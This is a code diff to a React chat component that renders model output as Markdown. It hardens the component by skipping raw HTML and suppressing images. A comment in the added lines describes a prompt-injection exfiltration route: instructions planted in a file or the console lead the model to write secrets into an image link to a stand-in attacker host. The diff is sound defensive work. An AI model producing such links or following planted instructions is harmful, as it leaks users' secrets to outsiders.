@@ -43,10 +43,13 @@ function CodeBlock({ content, language }: { content: string; language: string | 
   );
 }
 
-// react-markdown renders no raw HTML unless a rehype plugin allows it, so model output cannot
-// inject markup; links go through the panel's own safe link component.
+// Raw HTML is skipped, so model output cannot inject markup; links go through the panel's own safe
+// link component and only load on a click.
 const components: Components = {
   ...markdownComponents,
+  // Images load as soon as they render: an instruction planted in a file or the console could make
+  // the model put secrets into `![](https://attacker/?d=…)`. Never render them.
+  img: () => null,
   // The panel's translation markdown renders paragraphs inline; chat answers need real ones.
   p: ({ children }) => <p>{children}</p>,
   code: ({ className, children }) => {
@@ -62,7 +65,7 @@ const components: Components = {
 export default function ChatMarkdown({ text }: { text: string }) {
   return (
     <Typography className='min-w-0 break-words text-sm leading-relaxed [&_ol]:list-decimal [&_ol]:pl-6 [&_p:first-child]:mt-0 [&_p:last-child]:mb-0 [&_ul]:list-disc [&_ul]:pl-6'>
-      <Markdown remarkPlugins={[remarkGfm]} components={components}>
+      <Markdown remarkPlugins={[remarkGfm]} components={components} skipHtml>
         {text}
       </Markdown>
     </Typography>
